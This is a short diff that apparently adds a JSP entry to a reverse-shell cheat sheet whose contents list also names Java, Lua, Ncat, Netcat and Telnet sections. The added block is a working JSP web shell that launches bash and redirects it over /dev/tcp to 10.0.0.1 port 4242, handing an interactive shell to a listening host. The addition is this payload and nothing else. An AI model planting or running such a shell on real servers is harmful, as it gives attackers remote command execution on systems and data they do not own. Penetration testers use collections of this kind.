@@ -16,6 +16,7 @@
     * [Java Alternative 1](#java-alternative-1)
     * [Java Alternative 2](#java-alternative-2)
     * [Java](#java)
+    * [JSP](#jsp)
     * [Lua](#lua)
     * [Ncat](#ncat)
     * [Netcat OpenBsd](#netcat-openbsd)
@@ -302,6 +303,21 @@ Thread thread = new Thread(){
     }
 }
 thread.start();
+```
+
+### JSP
+
+```jsp
+<%@ page import="java.io.*" %>
+<%
+    try {
+         Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1"});
+    }
+    catch(IOException e) {
+         e.printStackTrace();
+    }
+%>
+
 ```
 
 ### Telnet
